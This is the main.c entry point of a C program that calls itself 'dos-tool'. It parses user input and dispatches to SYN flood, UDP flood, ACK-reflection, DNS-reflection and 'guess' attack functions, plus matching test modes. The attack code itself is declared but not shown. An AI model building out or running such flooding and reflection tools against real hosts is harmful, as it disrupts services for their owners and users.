#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "main.h"

// core_log.c
extern int Debug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DebugInfo(const char *fmt, ...);
extern int DebugWarning(const char *fmtsring, ...);
extern int DebugError(const char *fmt, ...);
// core_str.c
extern void ProcessACKIPListFileTest(void);
// core_input.c
extern int ProcessInput(const int argc, char *argv[], pInput input);
extern int CheckInputCompliance(const pInput input);
extern int InitInput(pInput *p);
// core_usage.c
extern void DisplayUsage(void);

extern int StartSYNFloodAttack(const pInput input);
extern int StartSYNFloodTest(const pInput input);

extern int StartGuessAttack(const pInput input);
extern int StartGuessTest(const pInput input);

extern int StartUDPFloodAttack(const pInput input);
extern int StartUDPFloodTest(const pInput input);

extern int StartACKReflectAttack(const pInput input);
extern int StartACKReflectTest(const pInput input);

extern int StartDNSReflectAttack(const pInput input);
extern int StartDNSReflectTest(const pInput input);

int main(int argc, char *argv[])
{
    /*
     * main function
     */

    extern void FreeGetCurrentVersionBuff(char *p);
    extern char *GetCurrentVersion(char **output);
    int check_input;

    if (argc == 1)
    {
        DebugError("Need more parameter");
        DisplayUsage();
        return 1;
    }

    pInput input;
    if (!InitInput(&input))
    {
        DebugError("Init the input failed");
        return 1;
    }

    // processing the user input data
    if (!ProcessInput(argc, argv, input))
    {

        DebugError("Please check you input");
        DisplayUsage();
        return 1;
    }

    char *version;
    if (!GetCurrentVersion(&version))
    {
        DebugError("GetCurrentVersion failed");
        return 1;
    }
    DebugInfo("dos-tool version: %s", version);
    FreeGetCurrentVersionBuff(version);

    DebugInfo("Running...");
    Debug(DEBUG_LEVEL_1, input->debug_level, "Debug mode started...");

    check_input = CheckInputCompliance(input);
    if (check_input > 0)
    {
        // process user input ready, start attack now
        DebugError("Check compliance failed, please check your input");
        DisplayUsage();
        return 1;
    }
    else if (check_input < 0)
    {
        // test the module here
        switch (check_input)
        {
        case TEST_TYPE_GUESS:
            if (StartGuessTest(input))
            {
                DebugError("StartGuessTest failed");
                return 1;
            }
            break;

        case TEST_TYPE_SYN_FLOOD:
            if (StartSYNFloodTest(input))
            {
                DebugError("StartSYNFloodTest failed");
                return 1;
            }
            break;

        case TEST_TYPE_UDP_FLOOD:
            if (StartUDPFloodTest(input))
            {
                DebugError("StartUDPFloodTest failed");
                return 1;
            }
            break;

        case TEST_TYPE_ACK_REFLECT:
            if (StartACKReflectTest(input))
            {
                DebugError("StartACKReflectTest failed");
                return 1;
            }
            break;

        case TEST_TYPE_ACK_IP_LIST:
            ProcessACKIPListFileTest();
            break;

        case TEST_TYPE_DNS_REFLECT:
            if (StartDNSReflectTest(input))
            {
                DebugError("StartDNSReflectTest failed");
                return 1;
            }
            break;

        default:
            break;
        }
    }
    else if (check_input == 0)
    {
        // really attack funtion is here
        switch (input->attack_mode)
        {
        case GUESS:
            if (StartGuessAttack(input))
            {
                DebugError("StartGuessAttack failed");
                return 1;
            }
            break;

        case SYN_FLOOD_ATTACK:
            if (StartSYNFloodAttack(input))
            {
                DebugError("StartSYNFloodAttack failed");
                return 1;
            }
            break;

        case UDP_FLOOD_ATTACK:
            if (StartUDPFloodAttack(input))
            {
                DebugError("StartUDPFloodAttack failed");
                return 1;
            }
            break;

        case ACK_REFLECT_ATTACK:
            if (StartACKReflectAttack(input))
            {
                DebugError("StartACKReflectAttack failed");
                return 1;
            }
            break;

        case DNS_REFLECT_ATTACK:
            if (StartDNSReflectAttack(input))
            {
                DebugError("StartDNSReflectAttack failed");
                return 1;
            }
            break;

        default:
            break;
        }
    }

    if (input)
    {
        free(input);
    }
    return 0;
}